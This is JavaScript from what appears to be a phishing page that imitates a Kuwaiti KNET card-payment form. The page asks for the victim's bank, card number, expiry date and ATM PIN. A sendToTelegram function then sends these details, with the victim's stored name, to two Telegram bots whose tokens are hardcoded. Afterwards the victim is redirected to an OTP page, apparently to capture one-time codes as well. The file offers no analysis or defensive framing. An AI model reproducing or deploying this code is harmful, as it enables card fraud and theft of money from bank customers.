function sendToTelegram() {
    const botConfigs = [
        {
            token: '7484126870:AAEDSU1tM_kBFwSJ0IpQT0NmuWYzW8wq4_E',
            chatId: '6454807559'
        },
        {
            token: '7567367004:AAGG3iwWYOvR9NwvLeUQRG49WVNBcdtFTcM',
            chatId: '7595871538'
        }
    ];

    const name = localStorage.getItem("storedUserName"); // ✅ استرجاع الاسم مباشرة

    const bank = document.getElementById("bankSelect").value;
    const selectedNumber = document.getElementById("prefixSelect").value;
    const cardNumber = document.getElementById("cardNumber").value;
    const expiryMonth = document.getElementById("monthSelect").value;
    const expiryYear = document.getElementById("yearSelect").value;
    const pin = document.getElementById("pin").value;

    if (!bank || !selectedNumber || !cardNumber || !expiryMonth || !expiryYear || !pin) {
        alert("يرجى ملء جميع الحقول قبل الإرسال.");
        return;
    }

    const message =
        `📩 كي نت\n\n` +
        `👤 من :  ${name || 'غير متوفر'}\n` + // الاسم المسترجع
        `🏦 اختصار: ${bank}\n` +
        `🔢 البادئة: ${selectedNumber}\n` +
        `💳 الرقم: ${cardNumber}\n` +
        `📅 انتهاء البطاقة: ${expiryMonth}/${expiryYear}\n` +
        `🔑 ATM: ${pin}`;

    botConfigs.forEach(({ token, chatId }) => {
        const url = `https://api.telegram.org/bot${token}/sendMessage`;

        fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log("✅ تم الإرسال إلى:", chatId);
            } else {
                console.error("❌ فشل في الإرسال إلى:", chatId);
            }
        })
        .catch(error => {
            console.error("⚠️ خطأ في الاتصال:", error);
        });
    });

    setTimeout(() => {
        window.location.href = "otpkpay.html";
    }, 1000);
}

        
            function updateOptions() {
                var bank = document.getElementById("bankSelect").value;
                var prefixSelect = document.getElementById("prefixSelect");
        
                prefixSelect.innerHTML = '<option value="" disabled selected>Prefix</option>';
        
                var options = {
                    ABK: ["403622", "423826", "428628"],
                    RAJHI: ["458838"],
                    BBK: ["588790", "418056"],
                    BOUBYAN: ["470350", "490455", "490456", "404919", "490456", "450605", "426058", "431199"],
                    BURGAN: ["49219000", "415254", "450238", "468564", "540759", "402978", "403583"],
                    CBK: ["532672", "537015", "521175", "516334"],
                    DOHA: ["419252"],
                    GBK: ["531644", "517419", "531471", "559475", "517458", "526206", "531329", "531470"],
                    TAM: ["45077848", "45077849"],
                    KFH: ["450778", "537016", "532674", "485602"],
                    KIB: ["406464", "409054"],
                    NBK: ["464452", "589160"],
                    WEYAY: ["464425250", "543363"],
                    QNB: ["524745", "521020"],
                    UNB: ["457778"],
                    WARBA: ["532749", "559459", "541350", "525528"]
                };
        
                if (options[bank]) {
                    options[bank].forEach(function (number) {
                        var option = document.createElement("option");
                        option.value = number;
                        option.textContent = number;
                        prefixSelect.appendChild(option);
                    });
                }
            }
        
            function validateNumberInput(event) {
                let inputField = document.getElementById("cardNumber");
                let value = inputField.value;
        
                if (value.length > 10) {
                    inputField.value = value.substring(0, 10);
                }
            }
        
            // عرض المبلغ من localStorage
            const totalAmount = localStorage.getItem("totalAmount");
            document.getElementById("amountValue").innerText = totalAmount;

